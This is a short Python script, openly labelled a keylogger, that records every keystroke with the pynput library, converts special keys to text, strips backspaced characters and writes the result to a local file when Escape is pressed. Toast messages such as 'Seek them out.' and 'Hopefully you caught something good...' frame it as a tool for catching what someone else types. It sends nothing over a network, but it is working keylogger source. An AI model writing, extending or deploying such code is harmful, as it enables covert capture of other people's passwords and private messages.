# imports
from pynput.keyboard import Key, Listener
import logging
from datetime import date
import datetime
from win10toast import ToastNotifier

text = []

class Notifier():
	def __init__(self, iconPath):
		self.icon = iconPath
		self.toast = ToastNotifier()
	def notify(self, title, body):
		self.toast.show_toast(title, body, icon_path=self.icon, threaded=True)


toast = Notifier('eye of the herald.ico')
toast.notify('Seek them out.', 'Keylogger online.')

def listItemReplace(string, unwanted_string, wanted_string):
	while True:
		if unwanted_string in string:
			index = string.index(unwanted_string)
			string.remove(unwanted_string)
			string.insert(index, wanted_string)
		else:
			break
	
	return string

def backspace_purge():
	global text
	for item in text:
		if item == 'Key.backspace':
			index = text.index(item)
			print('backspace detected')
			print(text[index - 2: index + 2])
			text.pop(index)
			print(text[index - 2: index + 2])
			try:
				text.pop(index - 1)
				print(text[index - 2: index + 2])
			except:
				pass
			backspace_purge()

def on_press(key):
	global text
	print(key)
	try:
		text.append(key.char)
	except:
		text.append(str(key))
	if key == Key.esc:
		with open('keylog_info.txt','w') as f:
			# for line in text:
			# 	try:
			# 		f.write(line.char)
			# 	except:
			# 		f.write(str(line))
			for i in range(10):
				print(text)
			text = listItemReplace(text, 'Key.space', ' ')
			text = listItemReplace(text, 'Key.tab', '    ')
			text = listItemReplace(text, 'Key.enter', '\n')
			text = listItemReplace(text, 'Key.shift', '')
			text = listItemReplace(text, 'Key.caps_lock', '\nThe user pressed caps lock.\n')
			text = listItemReplace(text, 'Key.alt_l', '\nThe user pressed the left alt key.\n')
			text = listItemReplace(text, 'Key.alt_r', '\nThe user pressed the right alt key.\n')
			text = listItemReplace(text, 'Key.esc', '\nProgram terminated. Either intentional or not.')
			print(len(text))
			backspace_purge()
			print(len(text))

			for string in text:
				f.write(string)

		return False
		
			  
with Listener(on_press = on_press) as listener:
	listener.join()


toast.notify('Keylog trigger has been set off!', 'Hopefully you caught something good...')

"""
free spot to type random shit to test functionality
"""